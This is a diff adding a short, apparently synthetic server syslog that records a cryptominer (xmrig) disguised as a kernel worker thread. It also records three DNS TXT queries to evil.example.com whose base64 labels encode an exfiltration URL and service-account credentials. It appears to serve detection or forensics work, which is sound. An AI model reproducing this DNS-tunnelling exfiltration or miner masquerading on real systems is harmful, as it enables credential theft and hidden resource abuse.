@@ -1,0 +1,8 @@
+Feb 10 14:00:01 server4 CRON[1234]: (root) CMD (/usr/lib/postgresql/13/bin/pg_isready)
+Feb 10 14:30:01 server4 CRON[1235]: (root) CMD (/usr/lib/postgresql/13/bin/pg_isready)
+Feb 10 14:55:01 server4 kernel: CPU 98%: process 'kworker/0:2' pid 31337
+Feb 10 14:55:12 server4 kernel: xmrig[31337]: segfault at 0x0 ip 00007f3a2b rsp 00007ffd3c error 4 in xmrig[400000+1c6000]
+Feb 10 14:58:33 server4 dnsmasq[892]: query[TXT] aHR0cDovL2V4ZmlsLmV4YW1wbGUu.t.evil.example.com from 10.0.2.10
+Feb 10 14:58:34 server4 dnsmasq[892]: query[TXT] Y29tL2NvbGxlY3Q/ZD1jcmVkcw==.t.evil.example.com from 10.0.2.10
+Feb 10 14:58:35 server4 dnsmasq[892]: query[TXT] dXNlcm5hbWU9YXBwX3N2Yywgcg==.t.evil.example.com from 10.0.2.10
+Feb 10 14:59:01 server4 CRON[1236]: (root) CMD (/usr/lib/postgresql/13/bin/pg_isready)
